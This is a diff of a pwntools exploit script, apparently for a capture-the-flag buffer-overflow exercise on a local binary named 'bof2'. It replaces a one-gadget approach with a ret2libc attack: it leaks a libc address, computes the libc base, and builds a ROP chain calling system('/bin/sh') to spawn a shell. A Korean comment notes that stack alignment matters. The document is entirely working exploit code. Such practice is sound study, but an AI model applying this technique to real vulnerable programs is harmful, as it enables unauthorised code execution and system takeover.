@@ -1,19 +1,33 @@
 from pwn import *
 
-p=process('./bof')
-stack=b'y'.ljust(16,b'A')
-offset=171408
-onegadget=0xef4ce
+# context.log_level='debug'
+context.arch='amd64'
+p=process('./bof2')
+e=ELF('./bof2')
+libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
-p.sendline(stack)
+pl1=b'y'+b'A'*14
 p.recvline()
-data=p.recvline()[:-1][-6:]+b'\x00'*2
-pause()
-print(data)
+p.sendline(pl1)
+data=p.recvline()[-7:-1]
+data=u64(data+b'\x00\x00')
+print(f"data= {data}")
+libc_base=data-0x28000-0x21ca
+pop_rdi=0x000000000010f75b+libc_base
+ret=0x000000000002882f+libc_base
+libc_system=libc_base+libc.symbols['system']
+print(f"libc_base= {hex(libc_base)}")
+bin_sh=list(libc.search(b'/bin/sh'))[0]+libc_base
 
+payload=p64(ret)
+payload+=p64(pop_rdi)
+payload+=p64(bin_sh)
+payload+=p64(libc_system)
 
+p.sendline(b'n'*16+payload)
 
 p.interactive()
+
 
 #얼라인먼트에 대한 지식이 필요함
 #objdump -S /lib/x86-64
